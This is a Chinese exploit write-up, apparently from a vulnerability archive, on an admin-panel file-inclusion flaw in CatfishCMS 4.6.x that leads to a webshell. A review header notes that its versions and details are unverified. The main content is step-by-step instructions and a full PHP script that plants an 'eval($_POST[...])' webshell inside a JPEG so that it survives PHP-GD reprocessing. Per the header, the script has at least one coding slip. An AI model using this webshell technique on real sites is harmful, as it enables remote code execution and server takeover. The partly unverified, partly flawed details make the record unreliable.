---
source: "hatch 补库批 20260928"
product: "CatfishCMS"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "CatfishCMS 4.6.15 后台文件包含getshell"
prerequisites: "来源所述条件，未列明部分仍待核：4.6.15 title vs4.6.12 paths; admin newpage template control; GD/JPEG payload survives transformation"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0492438a7867477d65d428f2"
entity_id: "ve-0492438a7867477d65d428f2"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：4.6.15 title vs4.6.12 paths; admin newpage template control; GD/JPEG payload survives transformation

- **事实待核（1）**：Exact inclusion request and template field only in images; version mismatch。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：Long image helper credited to Sergey Bobrov; displayed $dis-&gt;readByte lacks() at one branch。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（3）**：Helper uses old PHP unquoted index; supported PHP/GD versions and image quality must be stated。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（4）**：Distinct inclusion component complementary to full XSS chain。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# CatfishCMS 4.6.15 后台文件包含getshell

一、漏洞简介
------------

使用TP的模版函数进行文件包含

二、漏洞影响
------------

CatfishCMS 4.6

三、复现过程
------------

### 漏洞原理

url：

    http://0-sec.org/cms/CatfishCMS-4.6.12/index.php/admin/Index/newpage.html

文件地址：\\CatfishCMS-4.6.12\\application\\admin\\controller\\Index.php

函数：newpage()

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId25.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId26.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId27.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId28.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId29.png)

### 复现

首先需要制作图片马

在正常图片中插入shell并无视GD图像库的处理，常规方法有两种

    1. 对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行
    2. 利用php-gd算法上的问题进行绕过

这里我们选择第二种，使用脚本进行处理图片并绕过

    1. 上传一张jpg图片，然后把网站处理完的图片再下回来 比如x.jpg
    2. 执行图片处理脚本脚本进行处理 php jpg_payload.php x.jpg
    3. 如果没出错的话，新生成的文件再次经过gd库处理后，仍然能保留webshell代码语句

提示：

    1. 图片找的稍微大一点 成功率更高
    2. shell语句越短成功率越高
    3. 一张图片不行就换一张 不要死磕注：上面的字全部是抄的，先说明一下不然给人按在地上骂就不好了

制作过程：

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId31.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId32.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId33.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId34.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId35.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId36.png)

图片马制作脚本

    <?php
        /*

        The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations
        caused by PHP functions imagecopyresized() and imagecopyresampled().
        It is necessary that the size and quality of the initial image are the same as those of the processed
        image.

        1) Upload an arbitrary image via secured files upload script
        2) Save the processed image and launch:
        php jpg_payload.php <jpg_name.jpg>

        In case of successful injection you will get a specially crafted image, which should be uploaded again.

        Since the most straightforward injection method is used, the following problems can occur:
        1) After the second processing the injected data may become partially corrupted.
        2) The jpg_payload.php script outputs "Something's wrong".
        If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another 
        initial image.

        Sergey Bobrov @Black2Fan.

        See also:
        https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

        */

        $a = '$_POST[eeeeeee]';
        $miniPayload = "<?php eval($a); ?><?php echo phpinfo(); ?>";
        /*$miniPayload = "<?php echo phpinfo(); ?>";*/
        if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
            die('php-gd is not installed');
        }
        
        if(!isset($argv[1])) {
            die('php jpg_payload.php <jpg_name.jpg>');
        }

        set_error_handler("custom_error_handler");

        for($pad = 0; $pad < 1024; $pad++) {
            $nullbytePayloadSize = $pad;
            $dis = new DataInputStream($argv[1]);
            $outStream = file_get_contents($argv[1]);
            $extraBytes = 0;
            $correctImage = TRUE;

            if($dis->readShort() != 0xFFD8) {
                die('Incorrect SOI marker');
            }

            while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
                $marker = $dis->readByte();
                $size = $dis->readShort() - 2;
                $dis->skip($size);
                if($marker === 0xDA) {
                    $startPos = $dis->seek();
                    $outStreamTmp = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        str_repeat("\0",$nullbytePayloadSize) . 
                        substr($outStream, $startPos);
                    checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                    if($extraBytes !== 0) {
                        while((!$dis->eof())) {
                            if($dis->readByte() === 0xFF) {
                                if($dis->readByte !== 0x00) {
                                    break;
                                }
                            }
                        }
                        $stopPos = $dis->seek() - 2;
                        $imageStreamSize = $stopPos - $startPos;
                        $outStream = 
                            substr($outStream, 0, $startPos) . 
                            $miniPayload . 
                            substr(
                                str_repeat("\0",$nullbytePayloadSize).
                                    substr($outStream, $startPos, $imageStreamSize),
                                0,
                                $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                    substr($outStream, $stopPos);
                    } elseif($correctImage) {
                        $outStream = $outStreamTmp;
                    } else {
                        break;
                    }
                    if(checkImage('payload_'.$argv[1], $outStream)) {
                        die('Success!');
                    } else {
                        break;
                    }
                }
            }
        }
        unlink('payload_'.$argv[1]);
        die('Something\'s wrong');

        function checkImage($filename, $data, $unlink = FALSE) {
            global $correctImage;
            file_put_contents($filename, $data);
            $correctImage = TRUE;
            imagecreatefromjpeg($filename);
            if($unlink)
                unlink($filename);
            return $correctImage;
        }

        function custom_error_handler($errno, $errstr, $errfile, $errline) {
            global $extraBytes, $correctImage;
            $correctImage = FALSE;
            if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
                if(isset($m[1])) {
                    $extraBytes = (int)$m[1];
                }
            }
        }

        class DataInputStream {
            private $binData;
            private $order;
            private $size;

            public function __construct($filename, $order = false, $fromString = false) {
                $this->binData = '';
                $this->order = $order;
                if(!$fromString) {
                    if(!file_exists($filename) || !is_file($filename))
                        die('File not exists ['.$filename.']');
                    $this->binData = file_get_contents($filename);
                } else {
                    $this->binData = $filename;
                }
                $this->size = strlen($this->binData);
            }

            public function seek() {
                return ($this->size - strlen($this->binData));
            }

            public function skip($skip) {
                $this->binData = substr($this->binData, $skip);
            }

            public function readByte() {
                if($this->eof()) {
                    die('End Of File');
                }
                $byte = substr($this->binData, 0, 1);
                $this->binData = substr($this->binData, 1);
                return ord($byte);
            }

            public function readShort() {
                if(strlen($this->binData) < 2) {
                    die('End Of File');
                }
                $short = substr($this->binData, 0, 2);
                $this->binData = substr($this->binData, 2);
                if($this->order) {
                    $short = (ord($short[1]) << 8) + ord($short[0]);
                } else {
                    $short = (ord($short[0]) << 8) + ord($short[1]);
                }
                return $short;
            }

            public function eof() {
                return !$this->binData||(strlen($this->binData) === 0);
            }
        }
    ?>

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId37.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId38.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId39.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId40.png)

![](./.resource/CatfishCMS4.6.15后台文件包含getshell/media/rId41.png)
